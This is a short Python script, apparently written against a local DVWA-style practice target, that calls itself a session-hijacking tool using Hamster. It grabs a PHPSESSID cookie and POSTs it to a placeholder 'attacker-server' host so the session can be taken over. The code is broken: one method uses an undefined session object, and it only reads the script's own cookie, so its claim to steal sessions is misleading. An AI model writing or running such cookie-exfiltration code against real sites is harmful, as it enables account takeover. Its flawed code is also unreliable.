import requests
from http.cookies import SimpleCookie

class SessionHijackingUsingHamster:
    """
    Session Sidejacking with Hamster
    
    Description:
    This Python class provides methods to perform session hijacking using the tool Hamster on the target URL
    http://127.0.0.1:81/vulnerabilities/xss_d/.
    """

    def steal_session_cookies(self, url):
        r = s.get(url)
        cookies = SimpleCookie(r.headers['Set-Cookie'])
        stolen_cookie = cookies['PHPSESSID'].value
        return stolen_cookie
    
    def hijack_session_using_hamster(self, stolen_cookie):
        hamster_server = 'http://attacker-server:8000'  # Replace this with actual Hamster server address
        post_data = {'session_id': stolen_cookie}
        response = requests.post(f'{hamster_server}/hijack_session', data=post_data)
        return response.text

# Main function
def main():
    target_url = 'http://127.0.0.1:81/vulnerabilities/xss_d/'
    
    with requests.Session() as s:
        hacker = SessionHijackingUsingHamster()
        stolen_cookie = hacker.steal_session_cookies(target_url)
        response = hacker.hijack_session_using_hamster(stolen_cookie)
        print(response)

if __name__ == '__main__':
    main()
